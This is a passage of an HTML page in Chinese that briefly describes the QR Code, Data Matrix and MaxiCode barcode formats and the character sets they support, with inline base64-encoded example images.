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" alt="QRCode">
<figcaption aria-hidden="true">QRCode</figcaption>
</figure>
<p>能存储所有 ASCII 字符和汉字。</p>
<h2 id="data-matrix-数据矩阵">Data Matrix 数据矩阵</h2>
<figure>
<img src="data:image/png;base64,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" alt="Data Matrix">
<figcaption aria-hidden="true">Data Matrix</figcaption>
</figure>
<p>支持所有 ASCII 字符、所有 ISO 字符和所有扩展二进制编码十进制交换码
(EBCDIC) 字符。</p>
<h2 id="maxicode-码">MaxiCode 码</h2>
<figure>
<img src="data:image/png;base64,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